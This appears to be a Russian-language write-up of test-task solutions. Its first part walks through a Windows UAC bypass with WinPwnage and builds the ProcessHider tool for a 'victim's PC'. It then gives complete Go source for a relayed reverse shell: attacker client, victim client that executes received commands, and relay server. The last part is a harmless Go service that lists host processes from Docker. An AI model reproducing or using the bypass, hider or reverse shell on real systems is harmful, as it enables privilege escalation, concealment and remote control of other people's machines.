# Задача 2
*Для теста программ в задаче №2 использовалась виртуальная windows 10 191206-1406*

## 2.1 Решение:
Действительно, существует моножество вариантов обойти UAC, например, второй вариант [отсюда](https://github.com/rootm0s/WinPwnage#uac-bypass-techniques)

для начала нужно скомпилировать проект, сделать это можно так
```bash
pip install pyinstaller
pyinstaller --onefile main.py
```

В каталоге dist нас будет ожидать exe файл, который уже можно запусить на зараженном ПК.

далее запускаем полученный exe файл:
```bash
main --use uac --id 2 --payload c:\\windows\\system32\\cmd.exe
```
В результате открывается cmd с правами администратора без UAC

![Alt text](src/poc2.1.gif)

## 2.2 Решение:

Скачиваем проект [отсюда](https://github.com/kernelm0de/ProcessHider).
1. Устанавливаем набор инструментов от 2015 года, чтобы собрать проект.

![Alt text](src/image-1.png)
2. Переносим все файлы из include в папку ProcessHider и поправляем импорты в main.cpp в той же папке

![Alt text](src/image-3.png)
3. Открываем проект и обновляем **target platform version** до 10.

![Alt text](src/image-2.png)

Cобираем проект и получаем вредонос, который можно запустить на ПК жертвы от имени администратора, напрмимер, с использованием программы в задаче 2.1.

![Alt text](src/poc2.2.gif)

## 2.3 Решение:

Так как атакуемая машина может находиться за NAT, то можно использовать сервер с белым ip-адресом. В таком случае мы будем общаться с машиной жертвы через сервер-посредник.

Решением является сервер, и два клиента, оба клиента подключаются к серверу, так как у него инвестный белый ip, клиент жертвы просто запускает команды через `exec.Command()`, а клиент-нападающий их отправляет.

[Код](https://github.com/dimosha19/TestTask/tree/main/reverse-shell)

клиент атакующей стороны: 

```go
package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"sync"
	"time"
)

func sendToServer(conn net.Conn) {
	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Println(">>>")

		text, err := reader.ReadString('\n')
		if err != nil {
			log.Fatal(err)
		}
		_, err = conn.Write([]byte(text + "\n"))
		if err != nil {
			fmt.Println("connection error")
			return
		}
	}
}

func receiveFromServer(conn net.Conn) {
	for {
		message := bufio.NewScanner(conn)

		for message.Scan() {
			fmt.Println(message.Text())
		}
	}
}

func main() {
	var conn net.Conn
	var err error

	for {
		conn, err = net.Dial("tcp", "127.0.0.1:8081")
		if err == nil {
			break
		}
		fmt.Println("cant connect to srv")
		time.Sleep(time.Second * 1)
	}

	wg := sync.WaitGroup{}
	wg.Add(2)

	go func() {
		defer wg.Done()
		receiveFromServer(conn)
	}()

	go func() {
		defer wg.Done()
		sendToServer(conn)
	}()

	wg.Wait()
}
```

Клиент жертвы:
```go
package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"strings"
	"time"
)

func receiveFromServer(conn net.Conn) {
	for {
		message, err := bufio.NewReader(conn).ReadString('\n')
		if err == io.EOF {
			log.Fatal(err)
		}

		command := strings.Fields(message)

		var cmd *exec.Cmd

		if len(command) == 1 {
			cmd = exec.Command(command[0])
		} else if len(command) > 1 {
			cmd = exec.Command(command[0], command[1:]...)
		} else {
			continue
		}

		cmd.Stdout = conn
		cmd.Stderr = conn

		cmd.Run()
	}
}

func main() {
	var conn net.Conn
	var err error

	for {
		conn, err = net.Dial("tcp", "127.0.0.1:8081")
		if err == nil {
			break
		}
		time.Sleep(time.Second * 1)
	}

	receiveFromServer(conn)
}
```

Сервер:

```go
package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"sync"
)

func receiveFromAttackSendToVictim(attc, vict net.Conn) {
	for {
		message, err := bufio.NewReader(attc).ReadString('\n')
		if err != nil {
			log.Fatal(err)
		}

		_, err = vict.Write([]byte(message + "\n"))
		if err != nil {
			fmt.Println("connection error")
			return
		}
	}
}

func receiveFromVictimSendToAttack(attc, vict net.Conn) {
	for {
		scanner := bufio.NewScanner(vict)

		for scanner.Scan() {
			fmt.Println(scanner.Text())
			_, err := attc.Write([]byte(scanner.Text() + "\n"))
			if err != nil {
				fmt.Println("connection error")
				return
			}
		}
	}
}

func main() {
	fmt.Println("Launching server...")

	ln, _ := net.Listen("tcp", "0.0.0.0:8081")
	fmt.Println("Waiting for attack side")
	connAttack, _ := ln.Accept()
	fmt.Println("Waiting for victim side")
	connVictim, _ := ln.Accept()
	fmt.Println("Server started")

	wg := sync.WaitGroup{}
	wg.Add(2)

	go func() {
		defer wg.Done()
		receiveFromAttackSendToVictim(connAttack, connVictim)
	}()
	go func() {
		defer wg.Done()
		receiveFromVictimSendToAttack(connAttack, connVictim)
	}()

	wg.Wait()
}
```
![Alt text](src/revsh.png)

# Задача 3

## 3.0 Решение:

Решением является [go-код](https://github.com/dimosha19/TestTask/tree/main/deamon). Список процессов получаем от системы вызывая `exec.Command("ps", "aux")`. Результат команды - сырой текст, его нужно дополнительно форматировать.

api_models.go:
```go
package deamon

type PID int

type proc struct {
	User    string   `json:"User"`
	Pid     PID      `json:"Pid"`
	Cpu     string   `json:"Cpu"`
	Mem     string   `json:"Mem"`
	Vsz     string   `json:"Vsz"`
	Rss     string   `json:"Rss"`
	Tty     string   `json:"Tty"`
	Stat    string   `json:"Stat"`
	Start   string   `json:"Start"`
	Time    string   `json:"Time"`
	Command []string `json:"Command"`
}

type ProcessResponse struct {
	Error   *string `json:"error,omitempty"`
	Process []proc  `json:"Process,omitempty"`
}

```

handlers.go

```go
package deamon

import (
	"bytes"
	"log"
	"net/http"
	"os/exec"
	"strconv"
	"strings"

	"github.com/gin-gonic/gin"
)

func GetProcList(c *gin.Context) {
	var out bytes.Buffer

	cmd := exec.Command("ps", "aux")
	cmd.Stdout = &out

	err := cmd.Run()
	if err != nil {
		log.Fatal(err)
	}

	c.IndentedJSON(
		http.StatusOK,
		ProcessResponse{
			Process: splitByRow(out.String()),
		},
	)
}

func splitByRow(str string) []proc {
	var res []proc
	procList := strings.Split(str, "\n")

	for i, proc := range procList {
		if i > 0 && proc != "" {
			convertedProc := convertProcToStruct(proc)
			res = append(res, convertedProc)
		}
	}

	return res
}

func convertProcToStruct(process string) proc {
	procProperties := strings.Fields(process)

	pid, err := strconv.Atoi(procProperties[1])
	if err != nil {
		log.Fatal(err)
	}

	return proc{
		User:    procProperties[0],
		Pid:     PID(pid),
		Cpu:     procProperties[2],
		Mem:     procProperties[3],
		Vsz:     procProperties[4],
		Rss:     procProperties[5],
		Tty:     procProperties[6],
		Stat:    procProperties[7],
		Start:   procProperties[8],
		Time:    procProperties[9],
		Command: procProperties[10:],
	}
}

```

routes.go

```go
package deamon

import (
	ginzerolog "github.com/dn365/gin-zerolog"
	"github.com/gin-gonic/gin"
)

// NewEngine returns a new gin instance.
func NewEngine() *gin.Engine {
	r := gin.New()
	r.Use(gin.Recovery())
	if gin.Mode() != "debug" {
		r.Use(ginzerolog.Logger("gin"))
	} else {
		r.Use(gin.Logger())
	}

	r.GET("/process", GetProcList)
	return r
}

```

server.go
```go
package deamon

import (
	"fmt"
	"net/http"
)

type Option func(s *http.Server)

func WithPort(port string) Option {
	return func(s *http.Server) {
		s.Addr = fmt.Sprintf(":%s", port)
	}
}

func WithHandler(handler http.Handler) Option {
	return func(s *http.Server) {
		s.Handler = handler
	}
}

func NewServer(options ...Option) *http.Server {
	srv := &http.Server{
		Addr: "0.0.0.0:8080",
	}

	for _, opt := range options {
		opt(srv)
	}

	return srv
}

```

## 3.1 Решение:

Описываем dockerfile и собираем его, например такой командой, если находимся в корне проекта

```bash 
docker build -f build/package/dockerfile -t imageName .
```

Чтобы запустить контейнер нужно дополнительно указать **--pid="host"**, чтобы увидеть процессы хоста, а не контейнера.
Например, такой командой:

```bash 
docker run --pid="host" --rm -p 8080:8080 imageName
```

Теперь, если мы зайдем на http://127.0.0.1:8080/process, то сможем увидеть список процессов хоста:

![PoC](src/image.png)
